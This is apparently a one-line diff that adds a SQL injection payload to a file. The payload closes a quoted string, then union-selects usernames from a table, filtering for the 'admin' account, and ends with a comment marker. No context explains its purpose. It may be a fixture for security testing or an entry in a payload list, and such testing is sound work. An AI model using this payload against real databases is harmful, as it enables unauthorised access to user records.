@@ -1,0 +1,1 @@
+') union select username from tlb where (username='admin') #
